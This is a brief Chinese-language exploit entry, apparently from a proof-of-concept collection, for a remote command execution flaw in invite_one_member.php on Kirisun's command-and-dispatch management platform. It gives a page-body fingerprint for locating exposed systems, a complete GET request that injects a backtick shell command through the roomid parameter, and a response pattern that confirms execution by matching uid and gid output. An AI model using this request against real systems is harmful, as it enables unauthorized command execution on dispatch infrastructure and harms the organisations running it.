# 科立讯通信有限公司指挥调度管理平台invite_one_member.phpRCE

科立讯通信有限公司指挥调度管理平台invite_one_member.php ｜ 命令执行 ｜ —
- **指纹**：`body="指挥调度管理平台"`
- **请求**：`GET /api/client/audiobroadcast/invite\_one\_member.php?callee=1\&roomid=`id>dudesuite.txt` HTTP/1.1`
- **响应特征**：200 ^(?=.*?uid)(?=.*?gid).\*?$